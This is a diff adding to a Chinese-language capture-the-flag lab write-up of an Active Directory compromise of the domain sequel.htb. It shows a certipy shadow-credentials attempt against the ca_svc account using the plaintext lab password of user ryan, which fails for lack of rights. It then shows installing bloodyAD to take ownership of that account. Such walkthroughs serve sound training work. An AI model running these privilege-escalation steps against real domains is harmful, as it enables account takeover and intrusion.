@@ -548,4 +548,28 @@ Starting Neo4j.
 然后upload data:选择文件夹的时候：Ctrl+H 可以看到隐藏的.nxc文件夹.nxc/logs/DC01_10.129.65.178_2026-01-18_022250_bloodhound.zip导入
 搜索：sql_svc@sequel.htb并标记为拥有'Mark User as Owned'
 ```
+#### Ryan 拥有WriteOwnerCA_SVC 的管理权：
+![图片](image/2026012001.png)
+```
+ #certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.67.243
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'd1aa3b15-25a4-cb34-9fd7-0bb897804351'
+[*] Adding Key Credential with device ID 'd1aa3b15-25a4-cb34-9fd7-0bb897804351' to the Key Credentials for 'ca_svc'
+[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+```
+#### 此操作失败，因为 ryan 当前不是 ca_svc 的所有者。Bloodhound 显示它是域管理员组Owns
+#### 将使用BloodyAD将 ryan 设置为所有者，然后授予 ryan 完全控制权限：
+```
+#pipx install --force bloodyAD
+  installed package bloodyad 2.5.3, installed using Python 3.11.2
+  These apps are now globally available
+    - bloodyAD
+    - bloodyad
+done! ✨ 🌟 ✨
+```
 
